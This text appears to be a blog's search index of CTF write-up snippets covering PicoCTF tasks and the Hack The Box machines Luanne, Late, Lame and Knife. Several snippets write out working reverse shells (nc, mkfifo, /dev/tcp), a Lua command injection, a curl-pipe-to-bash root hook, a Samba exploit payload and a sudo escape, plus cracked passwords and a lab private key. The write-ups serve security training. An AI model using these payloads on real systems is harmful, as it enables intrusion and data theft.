code. We get this:ZmxhZzogcGljb0NURntEMWRfdV9rbjB3X3BwdHNfcl96MXA1fQ - Possible algorithms: Base64 Encoded StringGo to terminal and type this:$ echo \"ZmxhZzogcGljb0NURntEMWRfdV9rbjB3X3BwdHNfcl96MXA1fQ\" | base64 -dflag: picoCTF{D1d_u_kn0w_ppts_r_z1p5}base64: invalid inputFlag is : picoCTF{D1d_u_kn0w_ppts_r_z1p5}" }, { "title": "MSB from PicoCTF", "url": "/posts/MSB-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "MSB from PicoCTFpage DescriptionThis image passes LSB statistical analysis, but we can’t help but think there must be something to the visual artifacts present in this image…Download the image hereHintsWhat’s causing the ‘corruption’ of the image?So let’s download it and see that it’s old ass art. From strings there is nothing readable, nor from cat,zsteg ,steghide, binwalk. MSB —&gt; Most Significant ByteLSB —&gt; Least Significant ByteSo Lets go to stegsolve. Download it from here.$ java -jar stegsolve.jar With this stegosolve is started.You will see the popup on the left top side of screen, click file and open the .pngfile you downloaded from site.Then click Analyze end Data extract. In bit planes choose:Red –&gt;7Blue –&gt;7Green –&gt;7Then save text and read it with:strings &lt;text_file&gt; | lessWhen you will see the text just type: /picoto find the flag:220a7069636f4354 467b31355f793075 \".picoCT F{15_y0u725f71756535375f 7175317830373163 r_que57_ qu1x071c5f30725f68337230 31635f3234643535 _0r_h3r0 1c_24d556265657d0a0a2254 686f752068617374 bee}..\"T hou hastThe flag is:picoCTF{15_y0ur_que57_qu1x071c_0r_h3r01c_24d55bee}" }, { "title": "Luanne from htb", "url": "/posts/Luanne-From-HTB/", "categories": "", "tags": "", "date": "2024-09-06 00:00:00 +0000", "snippet": "nmapgave thisPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)| ssh-hostkey:| 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)80/tcp open http nginx 1.19.0| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=.|_http-title: 401 Unauthorized|_http-server-header: nginx/1.19.0| http-robots.txt: 1 disallowed entry|_/weather9001/tcp open http Medusa httpd 1.12 (Supervisor process manager)|_http-server-header: Medusa/1.12| http-auth:| HTTP/1.1 401 Unauthorized\\x0D|_ Basic realm=default|_http-title: Error responseService Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsdsearching this Supervisor process managergot me to the default login.https://supervisor.readthedocs.io/_/downloads/en/stable/pdf/ on 19th pagethen logged in on 9001portreading the robots.txton 80port we know that we have to search somethingffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.218/weather/FUZZforecast [Status: 200, Size: 90, Words: 12, Lines: 2, Duration: 83ms]curlingthe given directory we get this:curl http://10.10.10.218/weather/forecast{\"code\": 200, \"message\": \"No city specified. Use 'city=list' to list available cities.\"}then we go oncurl http://10.10.10.218/weather/forecast?city=list{\"code\": 200,\"cities\": [\"London\",\"Manchester\",\"Birmingham\",\"Leeds\",\"Glasgow\",\"Southampton\",\"Liverpool\",\"Newcastle\",\"Nottingham\",\"Sheffield\",\"Bristol\",\"Belfast\",\"Leicester\"]}after using ffufwith special-charactersword list and lua injectionwe get to thishttp://10.10.10.218/weather/forecast?city=list%27);os.execute(%22id%22)--{\"code\": 500,\"error\": \"unknown city: listuid=24(_httpd) gid=24(_httpd) groups=24(_httpd)then we need to get reverse shell without any special charactersput this instead of idrm+/tmp/pbf;mkfifo+/tmp/pbf;cat+/tmp/pbf|/bin/sh+-i+2&gt;%261|nc+10.10.16.11+1234+&gt;/tmp/pbf'and we get reverse shell$ ls -latotal 20drwxr-xr-x 2 root wheel 512 Nov 25 2020 .drwxr-xr-x 24 root wheel 512 Nov 24 2020 ..-rw-r--r-- 1 root wheel 47 Sep 16 2020 .htpasswd-rw-r--r-- 1 root wheel 386 Sep 17 2020 index.html-rw-r--r-- 1 root wheel 78 Nov 25 2020 robots.txt$ cat .htpasswdwebapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0let’s crack itjohn hash -w=/usr/share/wordlists/rockyou.txtiamthebest (?)these are the credentials on 80port to loginThere is nothing thereon machine$ nenetstat -an | grep LISTENtcp 0 0 127.0.0.1.3000 *.* LISTENtcp 0 0 127.0.0.1.3001 *.* LISTENtcp 0 0 *.80 *.* LISTENtcp 0 0 *.22 *.* LISTENtcp 0 0 *.9001 *.* LISTENtcp6 0 0 *.22 *.* LISTENSo there is an 3001 and 3000port running internallycurl it from inside the machine$ curl localhost:3000 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 199 100 199 0 0 66333 0 --:--:-- --:--:-- --:--:-- 66333&lt;html&gt;&lt;head&gt;&lt;title&gt;401 Unauthorized&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;401 Unauthorized&lt;/h1&gt;/: &lt;pre&gt;No authorization&lt;/pre&gt;&lt;hr&gt;&lt;address&gt;&lt;a href=\"//localhost:3000/\"&gt;localhost:3000&lt;/a&gt;&lt;/address&gt;&lt;/body&gt;&lt;/html&gt;$ curl localhost:3000 --user webapi_user:iamthebest % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 386 100 386 0 0 96500 0 --:--:-- --:--:-- --:--:-- 77200&lt;!doctype html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Index&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;&lt;h3&gt;Weather Forecast API&lt;/h3&gt;&lt;/p&gt; &lt;p&gt;&lt;h4&gt;List available cities:&lt;/h4&gt;&lt;/p&gt; &lt;a href=\"/weather/forecast?city=list\"&gt;/weather/forecast?city=list&lt;/a&gt; &lt;p&gt;&lt;h4&gt;Five day forecast (London)&lt;/h4&gt;&lt;/p&gt; &lt;a href=\"/weather/forecast?city=London\"&gt;/weather/forecast?city=London&lt;/a&gt; &lt;hr&gt; &lt;/body&gt;&lt;/html&gt;$ curl localhost:3001 --user webapi_user:iamthebest % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 386 100 386 0 0 125k 0 --:--:-- --:--:-- --:--:-- 125k&lt;!doctype html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;Index&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;&lt;h3&gt;Weather Forecast API&lt;/h3&gt;&lt;/p&gt; &lt;p&gt;&lt;h4&gt;List available cities:&lt;/h4&gt;&lt;/p&gt; &lt;a href=\"/weather/forecast?city=list\"&gt;/weather/forecast?city=list&lt;/a&gt; &lt;p&gt;&lt;h4&gt;Five day forecast (London)&lt;/h4&gt;&lt;/p&gt; &lt;a href=\"/weather/forecast?city=London\"&gt;/weather/forecast?city=London&lt;/a&gt; &lt;hr&gt; &lt;/body&gt;&lt;/html&gt;the 80,3001ports are running the same thingso that means we have to do luacommand injection again$ ps -auxw | grep 3001r.michaels 396 0.0 0.0 34996 2024 ? Is 9:04AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /homeThis means r.michaelsare running itthe normal command injection we used doesn’t work anymoreon 9001port we learn thisr.michaels 396 0.0 0.0 34996 2024 ? Is 9:04AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/wwwLearning all the flags -u -X -s -i -I -Lfrom manualhttps://man.netbsd.org/NetBSD-6.0.1/httpd.8**-X** Enables directory indexing. A directory index will be gener- ated only when the default file (i.e. _index.html_ normally) is not present.**-u** Enables the transformation of Uniform Resource Locators of the form _/~user/_ into the directory _~user/public_html_ (but see the **-p** option above).the -umeans we can access the user directory$ curl --user webapi_user:iamthebest localhost:3001/~r.michaels/ % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 601 0 601 0 0 293k 0 --:--:-- --:--:-- --:--:-- 293k&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=\"utf-8\"/&gt;&lt;style type=\"text/css\"&gt;table {\tborder-top: 1px solid black;\tborder-bottom: 1px solid black;}th { background: aquamarine; }tr:nth-child(even) { background: lavender; }&lt;/style&gt;&lt;title&gt;Index of ~r.michaels/&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Index of ~r.michaels/&lt;/h1&gt;&lt;table cols=3&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Name&lt;th&gt;Last modified&lt;th align=right&gt;Size&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;&lt;a href=\"../\"&gt;Parent Directory&lt;/a&gt;&lt;td&gt;16-Sep-2020 18:20&lt;td align=right&gt;1kB&lt;tr&gt;&lt;td&gt;&lt;a href=\"id_rsa\"&gt;id_rsa&lt;/a&gt;&lt;td&gt;16-Sep-2020 16:52&lt;td align=right&gt;3kB&lt;/table&gt;&lt;/body&gt;&lt;/html&gt;We can read id_rsa and login with ssh$ curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 2610 100 2610 0 0 424k 0 --:--:-- --:--:-- --:--:-- 509k-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----chmod 600 it and use it for sshlogin**User Flag is: ea5f0ce6a917b0be1eabc7f9218febc0**luanne$ ls -latotal 52dr-xr-x--- 7 r.michaels users 512 Sep 16 2020 .drwxr-xr-x 3 root wheel 512 Sep 14 2020 ..-rw-r--r-- 1 r.michaels users 1772 Feb 14 2020 .cshrcdrwx------ 2 r.michaels users 512 Sep 14 2020 .gnupg-rw-r--r-- 1 r.michaels users 431 Feb 14 2020 .login-rw-r--r-- 1 r.michaels users 265 Feb 14 2020 .logout-rw-r--r-- 1 r.michaels users 1498 Feb 14 2020 .profile-rw-r--r-- 1 r.michaels users 166 Feb 14 2020 .shrcdr-x------ 2 r.michaels users 512 Sep 16 2020 .sshdr-xr-xr-x 2 r.michaels users 512 Nov 24 2020 backupsdr-xr-x--- 4 r.michaels users 512 Sep 16 2020 develdr-x------ 2 r.michaels users 512 Sep 16 2020 public_html-r-------- 1 r.michaels users 33 Sep 16 2020 user.txtthere is an gnupgand in backupsdirectory there is an encrypted tarfilesearching for netbsd gnupgwe get to thishttps://man.netbsd.org/netpgp.1**netpgp --encrypt** [**--output**=_filename_] [options] _file ..._ **netpgp --decrypt** [**--output**=_filename_] [**--pass-fd**=_fd_] [**--num-tries**=_attempts_] [options] _file ..._let’s decrypt the filenetpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output /tmp/test.tar.gzluanne$ tar -zxvf test.tar.gzx devel-2020-09-16/x devel-2020-09-16/www/x devel-2020-09-16/webapi/x devel-2020-09-16/webapi/weather.luax devel-2020-09-16/www/index.htmlx devel-2020-09-16/www/.htpasswdluanne$ lsdevel-2020-09-16 test.tar.gzluanne$ cd devel-2020-09-16/luanne$ lswebapi wwwluanne$ cat .htpasswdwebapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.This is different password, let’s crack itjohn hash -w=/usr/share/wordlists/rockyou.txtWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])Will run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statuslittlebear (?)Use that password to become rootluanne$ doas shPassword:sh: Cannot determine current working directory# iduid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)Root Flag is: 7a9b5c206e8e8ba09bb99bd113675f66***" }, { "title": "Late from HTB", "url": "/posts/Late-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Late from HTBnmapshowed nothing unusual.Go to site with IPand you will find subdomaintrough linkadd that to /etc/hosts10.10.11.156 images.late.htbThen go there and see that it’s img to textconvertedAfter trying some symbols trough img i discovered that site takes {}so it’s an sstiYou will have to write ssticode for Jinja2, screenshot it (would recomend WORD or LIBREOFFICE, set font to sans something) and then use it.This should return&lt;p&gt;uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)&lt;/p&gt;This means ssti payloadworkedNow we’ll have to get shell. Easiest way to do that is to create an reverse-shell.shwith commands:#!/bin/bashsh -i &gt;&amp;/dev/tcp/10.10.16.6/1235 0&gt;&amp;1And curlit and then execute. It will should look something like this.rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.6] from (UNKNOWN) [10.10.11.156] 41284sh: 0: can't access tty; job control turned off$ script /dev/null -c bashScript started, file is /dev/nullsvc_acc@late:~/app$User Flag Is: dfb2cac259dc6fd1ecc098e338590e1a***Then search what files do you own except /home and /proc directoriesfind / -user svc_acc 2&gt;/dev/null | grep -v '/proc\\|/home'/usr/local/sbin/usr/local/sbin/ssh-alert.sh/dev/pts/0We’ll need ssh-alert.sh, you are the owner of this file but can’t change anything only add to it trough echo &gt;&gt;.This code is executed when someone tries to connect to sshand it is sent to rootSo we’ll have to add something to this code and when it gets executed we should get rootObviously we’ll need id_rsafind it in /home/svc_acc/.ssh/id_rsasave it and thenchmod 600 id_rsaadd this to code so when we connect we will get root trough netcat.echo ' curl 10.10.16.6:8000/reverse-shell.sh | bash' &gt;&gt; ssh-alert.shIt will give us root connectionon new reverse-shell when this code is executed.simple python3 server should be runningGo to sshand then try to connect while nc listenershould be onnc -nvlp 1235listening on [any] 1235 ...conn![[Screenshot from 2024-08-16 22-48-02.png]]ect to [10.10.16.6] from (UNKNOWN) [10.10.11.156] 38904bash: cannot set terminal process group (4712): Inappropriate ioctl for devicebash: no job control in this shellroot@late:/#Root Flag is: 77963c07bb1f90e5c73011efa9463c2e***" }, { "title": "Lame from HTB", "url": "/posts/Lame-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Lame from HTB\t[page](https://app.hackthebox.com/machines/Lame) First do the `nmap`scan: ```bash $ nmap -sCV --min-rate 4000 -Pn 10.10.10.3 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-02 22:57 +04 Nmap scan report for 10.10.10.3 Host is up (0.26s latency). Not shown: 996 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.16.47 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelHost script results:|clock-skew: mean: 2h00m24s, deviation: 2h49m46s, median: 21s|_smb2-time: Protocol negotiation failed (SMB2)| smb-security-mode:| account_used: guest| authentication_level: user| challenge_response: supported| message_signing: disabled (dangerous, but default)| smb-os-discovery:| OS: Unix (Samba 3.0.20-Debian)| Computer name: lame| NetBIOS computer name:| Domain name: hackthebox.gr| FQDN: lame.hackthebox.gr|_ System time: 2024-08-02T14:58:40-04:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 58.06 secondsAs you see there is `FTP`port open and It's accessible with anonymous, but there is nothing on `FTP`:```bash$ ftp 10.10.10.3Connected to 10.10.10.3.220 (vsFTPd 2.3.4)Name (10.10.10.3:giorgi): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||22305|).150 Here comes the directory listing.226 Directory send OK.ftp&gt; pwdRemote directory: /ftp&gt; ls -la229 Entering Extended Passive Mode (|||61662|).150 Here comes the directory listing.drwxr-xr-x 2 0 65534 4096 Mar 17 2010 .drwxr-xr-x 2 0 65534 4096 Mar 17 2010 ..226 Directory send OK.There is no exploits on vsftpd 2.3.4to do something to FTP.Next is SMB, Lets connect to it:$ smbmap -H 10.10.10.3 ________ ___ ___ _______ ___ ___ __ _______ /\" )|\" \\ /\" || _ \"\\ |\" \\ /\" | /\"\"\\ | __ \"\\ (: \\___/ \\ \\ // |(. |_) :) \\ \\ // | / \\ (. |__) :) \\___ \\ /\\ \\/. ||: \\/ /\\ \\/. | /' /\\ \\ |: ____/ __/ \\ |: \\. |(| _ \\ |: \\. | // __' \\ (| / /\" \\ :) |. \\ /: ||: |_) :)|. \\ /: | / / \\ \\ /|__/ \\ (_______/ |___|\\__/|___|(_______/ |___|\\__/|___|(___/ \\___)(_______)-----------------------------------------------------------------------------SMBMap - Samba Share Enumerator v1.10.4 | Shawn Evans - ShawnDEvans@gmail.com&lt;mailto:ShawnDEvans@gmail.com&gt; https://github.com/ShawnDEvans/smbmap[*] Detected 1 hosts serving SMB[*] Established 1 SMB connections(s) and 1 authenticated session(s)[+] IP: 10.10.10.3:445 Name: 10.10.10.3 Status: Authenticated Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers tmp READ, WRITE oh noes! opt NO ACCESS IPC$ NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ NO ACCESS IPC Service (lame server (Samba 3.0.20-Debian))[*] Closed 1 connectionsNext connect to SMBclientitself:$ smbclient -N \\\\\\\\10.10.10.3\\\\tmpAnonymous login successfulTry \"help\" to get a list of possible commands.smb: \\&gt; help? allinfo altname archive backupblocksize cancel case_sensitive cd chmodchown close del deltree dirdu echo exit get getfaclgeteas hardlink help history iosizelcd link lock lowercase lsl mask md mget mkdirmkfifo more mput newer notifyopen posix posix_encrypt posix_open posix_mkdirposix_rmdir posix_unlink posix_whoami print promptput pwd q queue quitreadlink rd recurse reget renamereput rm rmdir showacls seteasetmode scopy stat symlink tartarmode timeout translate unlock volumevuid wdel logon listconnect showconnecttcon tdis tid utimes logoff.. !smb: \\&gt; ls . D 0 Fri Aug 2 23:15:20 2024 .. DR 0 Sat Oct 31 10:33:58 2020 .ICE-unix DH 0 Fri Aug 2 21:19:43 2024 5571.jsvc_up R 0 Fri Aug 2 21:20:45 2024 vmware-root DR 0 Fri Aug 2 21:19:54 2024 .X11-unix DH 0 Fri Aug 2 21:20:09 2024 .X0-lock HR 11 Fri Aug 2 21:20:09 2024 vgauthsvclog.txt.0 R 1600 Fri Aug 2 21:19:41 2024 7282168 blocks of size 1024. 5386428 blocks availablesmb: \\&gt; exitI found nothing and tried to find exploit on ` Samba smbd 3.0.20`and found this github repository. I downloaded the script and ran This:$nc -nlvp 1234 #(in other terminal)$ python3 smbExploit.py 10.10.10.3 139 'nc -e /bin/sh 10.10.16.47 1234'[*] Sending the payload[*] Something went wrongERROR:I got the connection and then proceeded:$ nc -nlvp 1234listening on [any] 1234 ...ncconnect to [10.10.16.47] from (UNKNOWN) [10.10.10.3] 32826 ls whoamiroot pwd/ cd root ls -latotal 80drwxr-xr-x 13 root root 4096 Aug 2 13:20 .drwxr-xr-x 21 root root 4096 Oct 31 2020 ..-rw------- 1 root root 373 Aug 2 13:20 .Xauthoritylrwxrwxrwx 1 root root 9 May 14 2012 .bash_history -&gt; /dev/null-rw-r--r-- 1 root root 2227 Oct 20 2007 .bashrcdrwx------ 3 root root 4096 May 20 2012 .configdrwx------ 2 root root 4096 May 20 2012 .filezilladrwxr-xr-x 5 root root 4096 Aug 2 13:20 .fluxboxdrwx------ 2 root root 4096 May 20 2012 .gconfdrwx------ 2 root root 4096 May 20 2012 .gconfddrwxr-xr-x 2 root root 4096 May 20 2012 .gstreamer-0.10drwx------ 4 root root 4096 May 20 2012 .mozilla-rw-r--r-- 1 root root 141 Oct 20 2007 .profiledrwx------ 5 root root 4096 May 20 2012 .purple-rwx------ 1 root root 4 May 20 2012 .rhostsdrwxr-xr-x 2 root root 4096 May 20 2012 .sshdrwx------ 2 root root 4096 Aug 2 13:20 .vncdrwxr-xr-x 2 root root 4096 May 20 2012 Desktop-rwx------ 1 root root 401 May 20 2012 reset_logs.sh-rw------- 1 root root 33 Aug 2 13:19 root.txt-rw-r--r-- 1 root root 118 Aug 2 13:20 vnc.log cat root.txt0c7a1edf58797d5b51d882647124ae1b cd ..lsbinbootcdromdevetchomeinitrdinitrd.imginitrd.img.oldliblost+foundmediamntnohup.outoptprocrootsbinsrvsystmpusrvarvmlinuzvmlinuz.old cd home lsftpmakisserviceuser cd makis lsuser.txtcat user.txt47c1bb3b953857502526a5afa78dff5cAnd that’s the flags:User.txt — 47c1bb3b953857502526a5afa78dff5cRoot.txt — 0c7a1edf58797d5b51d882647124ae1b" }, { "title": "Laboratory from HTB", "url": "/posts/Laboratory-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Laboratory from HTBnmap gave this:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)| 256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)|_ 256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)80/tcp open http Apache httpd 2.4.41|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to https://laboratory.htb/443/tcp open ssl/http Apache httpd 2.4.41 ((Ubuntu))|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http/1.1| ssl-cert: Subject: commonName=laboratory.htb| Subject Alternative Name: DNS:git.laboratory.htb| Not valid before: 2020-07-05T10:39:28|_Not valid after: 2024-03-03T10:39:28|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: The LaboratoryService Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelAdd this to /etc/hosts10.10.10.216 laboratory.htb git.laboratory.htb" }, { "title": "Knife from HTB", "url": "/posts/Knife-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Knife from HTBsite uses php 8.1.0which is exploitable. Code for reverse shell is available in this github repositoryhttps://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.pyexecute that script and you will get reverse shell**User Flag is: c34d0950352a6c385a671f54eeeee9bc**After running linpeaswe find thisMatching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knifethen i found thishttps://gtfobins.github.io/gtfobins/knife/we can do privilege escaltion with thisjames@knife:/$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'python3 -c 'import pty;pty.spawn(\"/bin/bash\")'james@knife:/$zsh: suspended rlwrap nc -nvlp 1234stty raw -echo;fg[1] + continued rlwrap nc -nvlp 1234james@knife:/$ export TERM=xtermexport TERM=xtermjames@knife:/$ sudo knife exec -E 'exec \"/bin/sh\"'sudo knife exec -E 'exec \"/bin/sh\"'#Root Flag is: dc9bc9b178e4e2b8001667b559a2d479***" }, { "title": "JaWT scratchpad from PicoCTF", "url": "/posts/JaWT-Scratchpad-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "JaWT scratchpad from PicoCTFpage DescriptionCheck the admin scratchpad! https://jupiter.challenges.picoctf.org/problem/63090/ or http://jupiter.challenges.picoctf.org:63090 HintsWhat is that cookie?Have you heard of JWT?That means we have to modify cookie to access the flag, also that is JWT tokenso we will have to visit this site: jwt.io and load the cookie we get after logging in with any user. Just to try login with adminbut when you try it will deny. So inspect and copy the jwtcookie you get after logging in: Copy that and go to jwt.io and paste the cookie there.Notice how there is Johnin the end with link that takes us to John The Ripper, So we have to brute force this token to get the password:$ john --format=HMAC-SHA256 